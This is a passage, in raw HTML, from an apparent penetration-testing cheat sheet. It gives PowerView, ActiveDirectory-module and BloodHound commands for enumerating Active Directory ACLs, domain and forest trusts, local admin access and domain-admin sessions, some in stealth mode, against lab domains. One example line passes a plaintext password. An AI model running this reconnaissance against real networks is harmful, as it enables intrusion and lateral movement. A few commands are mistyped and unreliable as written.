&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Enumerate those GPOs where a particular user has interesting permissions&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Search for interesting ACEs:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">IdentityReference&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ActiveDirectoryRights&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ObjectDN&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ActiveDirectoryRights&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;GenericAll&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">IdentityReference&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ActiveDirectoryRights&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ObjectDN&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Check if a particular user has interesting permissions&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get the ACLs associated with the specified file path:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-PathAcl&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;\\cyberlab-dc.cyberlab.cybercorp.local\SYSVOL&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-PathAcl&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;\\COMPUTER1.cyberlab.cybercorp.local\C$&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="trusts-and-forests">Trusts and Forests&lt;/h2>
&lt;p>&lt;strong>Trust directions&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Direction&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Bidirectional&lt;/td>
&lt;td>Two-way&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Unidirectional&lt;/td>
&lt;td>One-way&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;p>&lt;strong>Trust transitivity&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Transitivity&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Transitive&lt;/td>
&lt;td>Can be extended to other domains in the forest&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Nontransititve&lt;/td>
&lt;td>Cannot be extended to other domains in the forest&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;p>&lt;strong>Trust Type&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Name&lt;/th>
&lt;th>Type&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Parent-child&lt;/td>
&lt;td>Automatic&lt;/td>
&lt;td>Automatically created between the new domain and the domain that precedes it in the namespace hierarchy whenever a new domain is added to a tree (always two-way transitive)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Tree-root&lt;/td>
&lt;td>Automatic&lt;/td>
&lt;td>Automatically created whenever a new domain tree is added to a forest root (always two-way transitive)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>External&lt;/td>
&lt;td>Established&lt;/td>
&lt;td>Two domains in different forests when forests do not have a trust relationship (one-way or two-way and nontransitive)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Shortcut&lt;/td>
&lt;td>Established&lt;/td>
&lt;td>Used to reduce access times in complex trust scenarios (one-way or two-way)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Forest&lt;/td>
&lt;td>Established&lt;/td>
&lt;td>Between forest root domains (one-way or two-way and transitive, if specified, or nontransitive)&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;p>Get a list of all domain trusts for the current or a trusted domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomainTrust&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADTrust&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;msDS-TrustForestTrustInfo -ne &amp;#34;$null&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADTrust&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get detail about the current or a trusted forest:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForest&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForest&lt;/span> &lt;span class="n">-Forest&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADForest&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADForest&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get all domains in the current or in a trusted forest:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span> &lt;span class="n">-Forest&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-ADForest&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">Domains&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get all global catalogs for the current or a trusted forest:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestCatalog&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestCatalog&lt;/span> &lt;span class="n">-Forest&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADForest&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">GlobalCatalogs&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Map trusts of a forest:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestTrust&lt;/span> &lt;span class="n">-Forest&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADTrust&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;msDS-TrustForestTrustInfo -ne &amp;#34;$null&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Map all the trusts of the domains in the current or in a trusted forest:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-NetDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span> &lt;span class="n">-Forest&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-NetDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## List only external trusts&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-NetDomainTrust&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">TrustType&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s1">&amp;#39;External&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## List all trusts of a trusting forest&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span> &lt;span class="n">-Forest&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="n">GetNetDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Try to build a relational mapping of all domain trusts:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-MapDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="user-hunting">User Hunting&lt;/h2>
&lt;p>Find all machines on the current/trusted domain where the current user has local admin access:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-LocalAdminAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-LocalAdminAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-NoPing&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-LocalAdminAccess&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Find-WMILocalAdminAccess.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-WMILocalAdminAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="n">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">targets&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-WMILocalAdminAccess&lt;/span> &lt;span class="n">-ComputerFile&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">targets&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Find-PSRemotingLocalAdminAccess.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-PSRemotingLocalAdminAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="n">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">targets&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-PSRemotingLocalAdminAccess&lt;/span> &lt;span class="n">-ComputerFile&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">targets&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Find-PSRemotingLocalAdminAccessCreds.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-PSRemotingLocalAdminAccessCreds&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;STUDENT01&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password123.&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find local admins on all machines of the domain (needs administrator privs on non-dc machines):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-EnumerateLocalAdmin&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-EnumerateLocalAdmin&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-NoPing&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-EnumerateLocalAdmin&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ComputerName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">AccountName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">IsGroup&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find computers where a domain admin (or specific user/group) has sessions:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="c"># Domain Admins&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">invoke-UserHunter&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">UserDomain&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">UserName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ComputerName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">SessionFromName&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Remote Desktop Users&amp;#34;&lt;/span> &lt;span class="c"># Specific group&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cyberlab.local&amp;#34;&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="c"># Specific user&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Poll&lt;/span> &lt;span class="mf">100&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;Administrator&amp;#34;&lt;/span> &lt;span class="n">-Delay&lt;/span> &lt;span class="mf">5&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find computers where a domain admin is logged into and checks if the local user has local administrator access:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-CheckAccess&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find computers where a domain admin is logged-in without sending queries to DCs:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-Stealth&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="bloodhound">Bloodhound&lt;/h2>
&lt;p>Commands to be run on a Linux machine to run Bloodhound analyzer:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">apt-get install bloodhound
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">neo4j console
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bloodhound
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Commands to be run on a domain machine to analyze the domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">SharpHound&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Gather data and information about the current domain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-BloodHound&lt;/span> &lt;span class="n">-CollectionMethod&lt;/span> &lt;span class="n">All&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-JSONFolder&lt;/span> &lt;span class="s2">&amp;#34;c:\experiments\bloodhound&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-BloodHound&lt;/span> &lt;span class="n">-CollectionMethod&lt;/span> &lt;span class="n">All&lt;/span> &lt;span class="n">-ExcludeDC&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-JSONFolder&lt;/span> &lt;span class="s2">&amp;#34;c:\experiments\bloodhound&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Gather information about established sessions&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">InvokeBloodHound&lt;/span> &lt;span class="n">-CollectionMethod&lt;/span> &lt;span class="n">LoggedOn&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="full-enumeration-sequence">Full Enumeration Sequence&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">PowerView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainSid&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForest&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-NetDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-MapDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Execute domain analysis for all domain of interest&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">gwmi &lt;/span>&lt;span class="n">Win32_NTDomain&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DomainName&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainSid&lt;/span>
